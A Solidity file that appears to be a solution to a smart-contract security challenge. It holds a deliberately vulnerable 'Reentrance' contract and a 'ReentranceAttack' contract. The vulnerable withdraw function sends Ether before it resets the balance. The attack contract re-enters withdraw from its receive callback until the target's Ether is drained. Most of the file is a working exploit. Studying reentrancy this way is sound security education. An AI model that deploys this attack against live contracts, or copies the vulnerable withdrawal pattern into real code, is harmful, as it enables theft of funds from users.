// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Reentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] = 0;
        }
    }

    receive() external payable {}
}

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;

    function balanceOf(address _who) external view returns (uint256);
}

contract ReentranceAttack {
    event AttackReceived(address indexed source, uint256 amount);

    IReentrance public targetContract;

    constructor(address target) {
        targetContract = IReentrance(target);
    }

    function attack() external payable {
        targetContract.donate{value: msg.value}(address(this));
        initiateWithdrawal();
    }

    receive() external payable {
        emit AttackReceived(msg.sender, msg.value);
        if (address(targetContract).balance > 0) {
            initiateWithdrawal();
        }
    }

    function initiateWithdrawal() internal {
        uint256 targetBalance = address(targetContract).balance;
        uint256 balance = targetContract.balanceOf(address(this));
        // 每次取款金额不能超过我们的余额，也不能超过目标合约的总余额
        uint256 amountToWithdraw = (balance < targetBalance) ? balance : targetBalance;
        targetContract.withdraw(amountToWithdraw);
    }
}
